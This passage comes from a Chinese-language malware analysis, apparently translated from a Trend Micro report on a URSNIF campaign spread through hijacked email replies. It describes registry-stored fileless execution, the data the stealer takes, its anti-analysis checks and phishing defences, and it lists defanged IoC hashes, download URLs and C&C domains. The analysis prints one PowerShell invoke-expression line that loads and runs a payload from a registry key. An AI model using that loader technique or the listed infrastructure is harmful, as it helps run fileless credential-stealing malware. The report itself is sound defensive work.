+<img alt="" class="size-full wp-image-7783 jetpack-lazy-image" data-lazy-sizes="(max-width: 389px) 100vw, 389px" data-lazy-src="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/08/5-3.png?resize=389%2C211&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/08/5-3.png?w=389&amp;ssl=1 389w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/08/5-3.png?resize=300%2C163&amp;ssl=1 300w" data-recalc-dims="1" height="211" src="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/08/5-3.png?resize=389%2C211&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="389" />       <noscript>
+ <img alt="" class="size-full wp-image-7783" data-recalc-dims="1" height="211" sizes="(max-width: 389px) 100vw, 389px" src="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/08/5-3.png?resize=389%2C211&amp;ssl=1" srcset="https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/08/5-3.png?w=389&amp;ssl=1 389w, https://i0.wp.com/www.iyouport.org/wp-content/uploads/2019/08/5-3.png?resize=300%2C163&amp;ssl=1 300w" width="389" /> 
+      </noscript>
+      <figcaption class="wp-caption-text" id="caption-attachment-7783">
+Figure 5. The registry key and entries containing scripts and binaries
+      </figcaption>
+    </figure>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="597c">请注意，尽管这些键和部分注册表项的名称在不同计算机上不尽相同，但其位置始终位于 HKCU\Software\AppDataLow\Software\Microsoft\。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="fa27">在下载组件后，会执行存储在 comsxRes（此名称可能会发生变化）中的 PowerShell 脚本。下面的命令行指令展示了如何调用注册表中的十六进制值。</p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="26b4">exe /C powershell invoke-expression([System.Text.Encoding]::ASCII.GetString((get-itemproperty ‘HKCU:\Software\AppDataLow\Software\Microsoft\3A861D62–51E0–7C9D-AB0E-15700F2219A4’).comsxRes</li>
+    </ul>
+    <figure aria-describedby="caption-attachment-7784" class="wp-caption aligncenter" id="attachment_7784" style="width: 352px">
+<img alt="" class="size-full wp-image-7784 jetpack-lazy-image" data-lazy-sizes="(max-width: 352px) 100vw, 352px" data-lazy-src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/08/6-2.png?resize=352%2C251&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/08/6-2.png?w=352&amp;ssl=1 352w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/08/6-2.png?resize=300%2C214&amp;ssl=1 300w" data-recalc-dims="1" height="251" src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/08/6-2.png?resize=352%2C251&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="352" />       <noscript>
+ <img alt="" class="size-full wp-image-7784" data-recalc-dims="1" height="251" sizes="(max-width: 352px) 100vw, 352px" src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/08/6-2.png?resize=352%2C251&amp;ssl=1" srcset="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/08/6-2.png?w=352&amp;ssl=1 352w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/08/6-2.png?resize=300%2C214&amp;ssl=1 300w" width="352" /> 
+      </noscript>
+      <figcaption class="wp-caption-text" id="caption-attachment-7784">
+Figure 6. Hex values of comsxRes
+      </figcaption>
+    </figure>
+    <p>当此脚本加载存储在注册表中的嵌入式二进制文件时，无文件执行就开始了。在下图中，用–{hex-encoded binary} — 替换了二进制数据，从而能展现出全部代码。原始脚本的最底部部分也是使用了 Base64 编码，对其进行了解码，以保证可读性。</p>
+    <figure aria-describedby="caption-attachment-7785" class="wp-caption aligncenter" id="attachment_7785" style="width: 795px">
+<img alt="" class="size-full wp-image-7785 jetpack-lazy-image" data-lazy-sizes="(max-width: 795px) 100vw, 795px" data-lazy-src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/08/7-2.png?resize=795%2C426&amp;is-pending-load=1#038;ssl=1" data-lazy-srcset="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/08/7-2.png?w=795&amp;ssl=1 795w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/08/7-2.png?resize=300%2C161&amp;ssl=1 300w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/08/7-2.png?resize=768%2C412&amp;ssl=1 768w" data-recalc-dims="1" height="426" src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/08/7-2.png?resize=795%2C426&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="795" />       <noscript>
+ <img alt="" class="size-full wp-image-7785" data-recalc-dims="1" height="426" sizes="(max-width: 795px) 100vw, 795px" src="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/08/7-2.png?resize=795%2C426&amp;ssl=1" srcset="https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/08/7-2.png?w=795&amp;ssl=1 795w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/08/7-2.png?resize=300%2C161&amp;ssl=1 300w, https://i2.wp.com/www.iyouport.org/wp-content/uploads/2019/08/7-2.png?resize=768%2C412&amp;ssl=1 768w" width="795" /> 
+      </noscript>
+      <figcaption class="wp-caption-text" id="caption-attachment-7785">
+Figure 7. Code of the embedded binary that is stored in the registry
+      </figcaption>
+    </figure>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="26d7">恶意程序会在创建的注册表项中搜索 Client32/Client64，并将该代码注入到 explorer.exe 以保证可以持续保留在内存中。注册表中的其他条目在后续例程运行过程中是必不可少的，因为这些条目会被注入的恶意软件代码所引用。例如，“TorClient” 条目指定了恶意软件如何通过 Tor 网络与其 C&amp;C 服务器通信。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="4b6f"><strong class="jy lh">
+    五、分析信息窃取例程
+   </strong></p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="4143">最终的 Payload 是一个名为 Client32 或 Client64 的 DLL 文件，具体取决于主机的体系架构。它也如同大多数恶意软件的组件一样，存储在注册表中。 <strong class="jy lh">
+    最终 Payload 的主要目标是进行信息窃取，其中包括以下信息：
+   </strong></p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="8481">· 系统信息</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="c263">· 已安装的应用程序列表</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="c38e">· 已安装的驱动程序列表</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="c4c4">· 正在运行的进程列表</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="684d">· 网络设备列表</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="26fa">· 外网IP地址</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="7b20">· 电子邮件凭据（IMAP、POP3、SMTP）</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="d5ec">· Cookie</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="8093">· 证书</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="f03d">· 屏幕视频捕获（AVI 格式）</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="b5d9">· 通过网页劫持获得的财务相关信息</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="a25b"><strong class="jy lh">
+    BSS 段加密
+   </strong></p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="ba6e">在趋势科技所分析的所有 URSNIF 二进制文件中，都包含这个加密部分。在这一部分中，包含着将在代码中使用的所有相关字符串，并且仅会在恶意程序运行时解密。因此无法对字符串进行分析，也无法进行反编译，使得整个分析过程更为复杂。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="04dc"><strong class="jy lh">
+    恶意软件的反分析机制
+   </strong></p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="0f34">为了防止研究人员通过沙箱获取到服务器和配置等信息，URSNIF 会在运行时两次检查光标的位置。如果光标位置不发生变化，那么就说明该恶意软件可能正在沙箱中进行分析，或是正在通过调试器进行分析。反分析的检查将在BSS部分被解密之前完成。如果发现存在问题，那么就会导致该恶意程序进入无限循环，并产生乱码字符串。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="b418">根据在这次攻击中所看到的情况，似乎攻击者正在不断对他们的网络钓鱼攻击方式进行更新，并探索更能有效迷惑用户的方法。这些网络攻击者不再满足于常规的钓鱼邮件，而是将他们的攻击巧妙的整合到正在进行的对话中，这就使得普通用户难以发现。这样的升级，其实正是攻击者和安全人员之间永无止境的猫捉老鼠游戏中的一部分。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="5eec"><strong class="jy lh">
+    防范方法
+   </strong></p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="83fa">由于网络钓鱼攻击依赖于社会工程技术，因此它们往往非常有效。这些技术会创建一些可信的场景或对话，从而诱使用户泄漏信息，或下载恶意软件。在本文的案例中，最棘手的问题在于发件人是真实的用户。由此提醒大家， <strong class="jy lh">
+    应该尽可能通过双因素身份认证（2FA）来保护自己的网络账户
+   </strong> 。此外，作为组织，还应该考虑将双因素身份认证集成到系统之中，并且为组织中的成员提供可靠的认证。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="c746">⚠️ 此外， <strong class="jy lh">
+    要防范网络钓鱼，还应注意以下几点
+   </strong> ：</p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="162b">组织中的所有用户都应具备足够的安全意识，了解网络钓鱼攻击的概念、网络钓鱼攻击的常见手段和识别可疑电子邮件的方法。</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="fb66">遇到任何可疑的请求时，都应进一步与相关人员进行核实，特别是在进行金融交易之前，务必要谨慎操作。</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="c598">避免打开任何建议修改 Word 中安全配置的文档，这样的文档很有可能是恶意文件。</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="3d30">留意邮件中所有可疑之处，包括是否符合对话的上下文、是否使用了你们常用的语言、是否使用的是常用的邮件签名。</li>
+    </ul>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="fcbc"><strong class="jy lh">
+    使用可管理的检测与响应服务（MDR）
+   </strong></p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="6ab8">随着网络钓鱼攻击方式的日益复杂，组织内部的IT团队和安全团队可能难以监控网络和各个终端是否存在被攻击的迹象。尽管提升员工的安全意识有助于防范威胁，但如果要让员工识别精心伪造的电子邮件，还是具有一定的难度。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="1d71">针对没有安全运营中心（SOC）的组织而言，就面临这一个双重挑战，因为一般的 IT 团队往往缺乏进行威胁研究和分析的经验。针对这些组织，建议采用第三方安全厂商的“可管理的检测与响应服务”（ <a class="bj cu ld le lf lg" href="https://www.trendmicro.com/en_us/business/products/user-protection/sps/endpoint/managed-detection-response.html"> MDR </a> ），从而帮助抵御高级威胁。Mdr 可以为攻击中的各种环境指标提供一个基线，并且使用这些指标作为安全分析的基础。</p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="3f04"><strong class="jy lh">
+    IoC
+   </strong></p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="afc2"><strong class="jy lh">
+    Word文件的哈希值
+   </strong></p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="3b69">检测为TROJ_FRS.VSN0BI18 / Trojan.W97M.POWLOAD.SMY：</p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="0b92">bdd3f03fb074c55cf46d91963313966ce26afdb13b1444258f8f9e7e723d8395</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="caa5">dd7b4fc4d5cc1c1e25c800d5622423725a1b29000f93b658a54e267bbbe6f528</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="d4ae">4df47982fdd1ac336625600fa8c947d45909248309b117d05fc532a2260c7bc4</li>
+    </ul>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="a8bb">检测为Trojan.W97M.POWLOAD.FGAIBT：</p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="0afe">f88ef62f2342f4d1105cfe85395b735efd3f0308b79551944983ce245d425510</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="c5ec">567fe3794a9eec27697ae0634861d284279261880887f60a7374c6cbe63b7674</li>
+    </ul>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="7c09">检测为Trojan.W97M.POWLOAD.NSFGAIBF：</p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="521e">52d3ece98b6b3b686925156c3d62d8ce133fe3326e11b4c981c251452e4a41d2</li>
+    </ul>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="86a7">检测为Trojan.W97M.POWLOAD.SMEMOT：</p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="771b">4d0762a6b2879d2fa821716db76bc980fdb3b8507611d2853df58c0d4127f9ea</li>
+    </ul>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="fbd3">检测为Trojan.W97M.POWLOAD.SMEMOT2：</p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="c087">47e2c66ba16e3ffa9704a13f2c00670319bf292b3d2aa7deede5442da02181e5</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="f040">c2c946f7fd63fc15048a9af4043686f5a56b169e74cb36892fb8d1563b810467</li>
+    </ul>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="0c75">检测为Trojan.W97M.POWLOAD.SMTHF3：</p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="a27e">21ce42a1fc6631ed10db3d0e44b4ccb6d96a729fc494bd86a57cf07ff72cb8f2</li>
+    </ul>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="f112">检测为Trojan.W97M.POWLOAD.SMY：</p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="c6ef">de8f8f39259992886da3b07635cbf121027379e5c1a156a32c6c6e5ace3cc4c3</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="4373">6b387b8534da9cc7cf0af4f2fb8c2a92f9316c0ea6ffb9cfe49b09b4c3df9778</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="dcf5">6bf99f4b17a07e788219333d96a7a19c9eddc1b49d16c2a21da255a6a16c80d5</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="8602">33d078881456e3b930c480803902fa28142b17c8550f3932e7cf4a1df0eb9213</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="53de">6ca2d4dcea456b9d4c87f211ed20bb32f71a0c78ee8059b934162e643d66e0c9</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="464d">82bee0c249b63f349d212a36f0b9ad90f909017ac734eac133353a1135d7474d</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="a4cc">1f2e12a58cc23f4e6e7f17b8c1a5c50b88614fda103577354b9564f2dffc257f</li>
+    </ul>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="2ece">检测为W2KM_POWLOAD.FGAIBT：</p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="44ef">1db71aec64d0e391a8c99f4f6ee214962a281733643ace0874cf69e2843f448c</li>
+    </ul>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="04e7">检测为W2KM_POWLOAD.NSFGAIBF：</p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="5fba">c33d642da477f65c11daa9e8098b9917c4c5a6f131dd1369a20cb1b14c4cc261</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="1e1a">398e677290b1db00d8751c3498847ad9c7d10721630175d2506c4d45af19d229</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="6186">813a08d3b2216c89d42e8225c6de760d785905d1c76bd7428201d68c3c368f65</li>
+    </ul>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="5d7f">检测为W2KM_POWLOAD.THIACAH：</p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="7ecc">5aed7d6a3e8692143e53f9556cd3aa371149c96b91c02d1c659cb58d88572e47</li>
+    </ul>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="a82f"><strong class="jy lh">
+    下载的URSNIF
+   </strong></p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="7414">检测为TSPY_URSNIF.THAOOCAH：</p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="20e1">0a38d92775cfc7182076d9a21c4937149ea8be6ebf22b9530afbca57d69c0d46</li>
+    </ul>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="2787"><strong class="jy lh">
+    可执行文件Payload
+   </strong></p>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="2e3e">检测为TrojanSpy.Win32.URSNIF.BAIEF：</p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="a3f8">358bd52ac46755b1c6fa73805a7a355450f85f4bcf1b2e798a04960743390422</li>
+    </ul>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="d6ee">检测为TSPY_URSNIF.THAOOCAH：</p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="39bc">e8633f2f2b6b0b8f7348b4660e325ab25b87ec8faa40fb49eb0215b31bd276aa</li>
+    </ul>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="5f8b">检测为TSPY_URSNIF.BAIEB：</p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="5d73">f92ba10fe245c00575ae8031d4c721fe0ebb0820a4f45f3bbce02654a6e7f18d</li>
+    </ul>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="aea9"><strong class="jy lh">
+    下载URL
+   </strong></p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="5567">hxxp://t95dfesc2mo5jr[.]com/RTT/opanskot[.]php?l=targa2[.]tkn</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="30ef">hxxp://enduuyyhgeetyasd[.]com/RTT/opanskot[.]php?l=omg8[.]tkn</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="a01e">hxxp://q0fpkblizxfe1l[.]com/RTT/opanskot[.]php?l=targa4[.]tkn</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="8ec7">hxxp://2dhtsif1a8jhyb[.]com/RTT/opanskot[.]php?l=okb1[.]tkn</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="e1a1">hxxp://yrtw1djmj6eth7[.]com/RTT/opanskot[.]php?l=okb7[.]tkn</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="a81f">hxxp://popoasdzxcqe[.]com/YUY/huonasdh[.]php?l=rgr7[.]tkn</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="d48e">hxxp://q0fpkblizxfe1l[.]com/RTT/opanskot[.]php?l=targa2[.]tkn</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="a2b2">hxxp://e3u1oz4an1dqmj[.]com/RTT/opanskot[.]php?l=okb9[.]tkn</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="4487">hxxp://popoasdzxcqe[.]com/YUY/huonasdh[.]php?l=rgr3[.]tkn</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="3b30">hxxp://2dhtsif1a8jhyb[.]com/RTT/opanskot[.]php?l=okb5[.]tkn</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="06ca">hxxp://hbhbasdqweb[.]com/YUY/huonasdh[.]php?l=rgr4[.]tkn</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="73ca">hxxp://q0fpkblizxfe1l[.]com/RTT/opanskot[.]php?l=targa4[.]tkn</li>
+    </ul>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="cfcf"><strong class="jy lh">
+    C&amp;C 服务器
+   </strong></p>
+    <ul class="">
+      <li class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj lr ls lt" data-selectable-paragraph="" id="df24">app[.]kartop[.]at</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="c9eb">doc[.]dicin[.]at</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="eff6">doc[.]avitoon[.]at</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="7c61">app[.]avitoon[.]at</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="3bd7">ops[.]twidix[.]at</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="ad66">xx[.]go10og[.]at</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="5bc9">api[.]kartop[.]at</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="bafd">m1[.]fofon[.]at</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="0c79">cdn[.]kartop[.]at</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="9a7b">api[.]tylron[.]at</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="2adb">chat[.]twidix[.]at</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="92bd">api[.]kaonok[.]at</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="8bab">chat[.]jimden[.]at</li>
+      <li class="jv jw ce bc jy b jz mb kb mc kd md kf me kh mf kj lr ls lt" data-selectable-paragraph="" id="46e4">mahono[.]cn</li>
+    </ul>
+    <p class="jv jw ce bc jy b jz ka kb kc kd ke kf kg kh ki kj" data-selectable-paragraph="" id="1c1b">趋势科技 XGen™安全性提供跨代混合的威胁防御技术，以保护系统免受各种类型的威胁，包括勒索软件和加密货币挖掘恶意软件。在网关和端点上具有高保真的机器学习功能，可以保护物理、虚拟和云工作负载。借助 Web / URL 过滤，行为分析和自定义沙盒等功能，XGen 安全可以抵御当今绕过传统控制的威胁，利用已知、未知或未公开的漏洞，窃取或加密个人身份数据、或进行恶意加密货币挖掘的威胁。◾️</p>
+    <div id="atatags-1611829871-5f402e2e578cb"></div>
+    <div class="sharedaddy sd-sharing-enabled">
+      <div class="robots-nocontent sd-block sd-social sd-social-icon sd-sharing">
+        <h3 class="sd-title" id="section"> 共享此文章： </h3>
+        <div class="sd-content">
+          <ul>
+            <li class="share-twitter"><a class="share-twitter sd-button share-icon no-text" data-shared="sharing-twitter-7777" href="https://www.iyouport.org/%e6%b8%94%e8%89%ba%e6%ad%a3%e5%9c%a8%e5%8d%87%e7%ba%a7%ef%bc%9aursnif-%e6%81%b6%e6%84%8f%e8%bd%af%e4%bb%b6%e6%96%b0%e5%8f%98%e7%a7%8d%e9%80%9a%e8%bf%87%e5%9b%9e%e5%a4%8d%e9%82%ae%e4%bb%b6%e5%8d%b3/?share=twitter" rel="nofollow noopener noreferrer" target="_blank" title="点击以在 Twitter 上共享"> <span> </span> <span class="sharing-screen-reader-text"> 点击以在 Twitter 上共享（在新窗口中打开） </span> </a></li>
